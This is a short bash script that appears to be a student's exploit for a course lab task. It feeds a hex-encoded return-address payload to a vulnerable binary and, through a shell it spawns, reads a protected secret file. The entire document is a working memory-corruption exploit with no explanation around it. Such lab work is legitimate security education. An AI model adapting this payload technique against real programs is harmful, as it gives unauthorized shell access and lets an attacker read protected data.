#!/usr/bin/env bash
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1970716/vuln "$(printf '\xb0\x7c\xc4\xf7\xc0\xa1\xc3\xf7\xf5\x90\xdb\xf7')" 1241
